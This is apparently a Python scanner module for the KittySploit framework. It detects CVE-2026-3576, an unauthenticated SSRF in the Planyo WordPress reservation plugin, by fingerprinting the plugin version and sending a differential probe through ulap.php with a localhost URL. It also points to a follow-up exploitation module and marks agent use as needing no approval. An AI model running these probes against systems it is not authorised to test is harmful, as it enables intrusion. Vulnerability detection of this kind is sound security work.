#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from typing import Optional, Tuple
from urllib.parse import urlencode

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "planyo-online-reservation-system"
_ULAP = "ulap.php"
_VULN_HIGH = (3, 0, 0)
_FIXED = "3.1"
_BLOCKED_MARKER = "not allowed"
_DISALLOWED_CONTROL_URL = "http://example.com/"
_LOCALHOST_PROBE_URL = "http://localhost/"


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "Planyo Online Reservation System CVE-2026-3576 detection",
        "description": (
            "Detects Planyo Online Reservation System <= 3.0 with unauthenticated SSRF "
            "via ulap.php ulap_url (CVE-2026-3576). Confirms the localhost allow-list "
            "bypass with a differential probe (disallowed host blocked, localhost not). "
            "Version/SSRF check only — no file:// LFI or content exfiltration."
        ),
        "author": ["rodtvs (incogbyte)", "KittySploit Team"],
        "severity": "high",
        "cve": "CVE-2026-3576",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-3576",
            "https://www.cve.org/CVERecord?id=CVE-2026-3576",
        ],
        "modules": [
            "auxiliary/admin/http/planyo_cve_2026_3576_ssrf",
        ],
        "tags": [
            "web",
            "scanner",
            "wordpress",
            "planyo",
            "ssrf",
            "unauthenticated",
            "cve-2026-3576",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 4,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "endpoints"],
            "cost": 1.0,
            "noise": 0.4,
            "value": 1.0,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": [],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": False,
                "capabilities_any": [],
                "capabilities_all": [],
                "confidence_min": {"wordpress": 0.3},
                "confidence_min_any": {},
                "endpoint_pattern_any": [],
                "param_any": [],
                "api_surface_ready": False,
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "ssrf_primitive", "from_detail": ""},
                ],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": [
                    "auxiliary/admin/http/planyo_cve_2026_3576_ssrf",
                ],
            },
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)

    def _wp_base(self) -> str:
        return self.wp_normalize_base_path(self.base_path or self.path or "/")

    def _ulap_path(self) -> str:
        return self.wp_plugin_path(self._wp_base(), _PLUGIN, _ULAP)

    def _fetch_plugin_version(self) -> Tuple[str, str]:
        wp_base = self._wp_base()
        version = self.wp_plugin_version(_PLUGIN, wp_base)
        readme = self.wp_plugin_path(wp_base, _PLUGIN, "readme.txt")
        if version:
            return version, readme

        for rel in (_ULAP, "planyo.php", "readme.txt"):
            path = self.wp_plugin_path(wp_base, _PLUGIN, rel)
            response = self.http_request(
                method="GET",
                path=path,
                allow_redirects=True,
                timeout=max(int(self.timeout or 10), 10),
            )
            if not response or response.status_code != 200:
                continue
            body = response.text or ""
            extracted = self.wp_extract_version_from_readme(body) or ""
            if extracted:
                return extracted, path
            low = body.lower()
            if "planyo" in low or "ulap" in low or "send_http_post" in low:
                return "", path
        return "", ""

    def _ulap_reachable(self) -> bool:
        response = self.http_request(
            method="GET",
            path=self._ulap_path(),
            allow_redirects=True,
            timeout=max(int(self.timeout or 10), 10),
        )
        if not response:
            return False
        # Standalone PHP proxy: typically 200 even without params.
        if response.status_code == 200:
            return True
        body = (response.text or "").lower()
        return "not allowed" in body or "ulap" in body or "planyo" in body

    def _ulap_request(self, ulap_url: str) -> Tuple[Optional[int], str]:
        path = self._ulap_path()
        query = urlencode({"ulap_url": ulap_url})
        response = self.http_request(
            method="GET",
            path=f"{path}?{query}",
            allow_redirects=True,
            timeout=max(int(self.timeout or 15), 15),
        )
        if not response:
            return None, ""
        return int(response.status_code), response.text or ""

    def _differential_ssrf(self) -> Optional[bool]:
        """
        Return True when localhost is allow-listed (vulnerable),
        False when both hosts are blocked (patched),
        None when the control response is inconclusive.
        """
        _ctrl_status, ctrl_body = self._ulap_request(_DISALLOWED_CONTROL_URL)
        ctrl_blocked = _BLOCKED_MARKER in (ctrl_body or "").lower()
        if not ctrl_blocked:
            # Endpoint may not be the Planyo proxy, or allow-list is disabled entirely.
            return None

        _ssrf_status, ssrf_body = self._ulap_request(_LOCALHOST_PROBE_URL)
        ssrf_blocked = _BLOCKED_MARKER in (ssrf_body or "").lower()
        if ssrf_blocked:
            return False
        return True

    def run(self):
        try:
            version, evidence_path = self._fetch_plugin_version()
            ulap_path = self._ulap_path()
            ulap_ok = self._ulap_reachable()

            if not evidence_path and not ulap_ok:
                return False

            if ulap_ok and not evidence_path:
                evidence_path = ulap_path

            print_success(
                f"Planyo plugin evidence at {evidence_path}"
                + (f" (version {version})" if version else "")
            )
            if ulap_ok:
                print_info(f"ulap.php reachable at {ulap_path}")

            ssrf_result = None
            if ulap_ok:
                ssrf_result = self._differential_ssrf()
                if ssrf_result is True:
                    print_warning(
                        "Differential SSRF check: disallowed host blocked, "
                        "localhost not blocked"
                    )
                elif ssrf_result is False:
                    print_info(
                        "Differential SSRF check: localhost is blocked "
                        "(allow-list appears patched)"
                    )
                else:
                    print_status(
                        "Differential SSRF check inconclusive "
                        "(control host was not blocked as expected)"
                    )

            if ssrf_result is True:
                self.set_info(
                    severity="high",
                    cve="CVE-2026-3576",
                    reason=(
                        "Planyo ulap.php allows unauthenticated SSRF to localhost "
                        "(CVE-2026-3576 allow-list bypass); fixed in "
                        f"{_FIXED}+"
                    ),
                    version=version or None,
                    path=ulap_path,
                    confidence="high",
                    service="wordpress",
                    endpoint=ulap_path,
                )
                return True

            if version and self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
                # Version in range but differential negative/inconclusive —
                # still report potential exposure (e.g. network blocked to localhost).
                confidence = "medium" if ssrf_result is None else "low"
                self.set_info(
                    severity="high",
                    cve="CVE-2026-3576",
                    reason=(
                        f"Planyo Online Reservation System {version} detected "
                        f"(<= {_VULN_HIGH[0]}.{_VULN_HIGH[1]}); "
                        "within CVE-2026-3576 range"
                        + (
                            "; SSRF differential not confirmed"
                            if ssrf_result is not True
                            else ""
                        )
                    ),
                    version=version,
                    path=evidence_path,
                    confidence=confidence,
                    service="wordpress",
                    endpoint=ulap_path,
                )
                return True

            if version:
                self.set_info(
                    severity="info",
                    reason=(
                        f"Planyo Online Reservation System {version} detected; "
                        f"appears outside CVE-2026-3576 range (fixed in {_FIXED}+)"
                    ),
                    version=version,
                    path=evidence_path,
                    service="wordpress",
                )
                return False

            if ulap_ok and ssrf_result is False:
                self.set_info(
                    severity="info",
                    reason=(
                        "Planyo ulap.php reachable but localhost requests are blocked; "
                        "likely patched for CVE-2026-3576"
                    ),
                    path=ulap_path,
                    service="wordpress",
                )
                return False

            self.set_info(
                severity="medium",
                cve="CVE-2026-3576",
                reason=(
                    f"Planyo plugin detected at {evidence_path}, "
                    "but version/SSRF status could not be confirmed"
                ),
                path=evidence_path,
                confidence="low",
                service="wordpress",
                endpoint=ulap_path,
            )
            return True
        except Exception as exc:
            print_error(f"Scanner failed: {exc}")
            return False
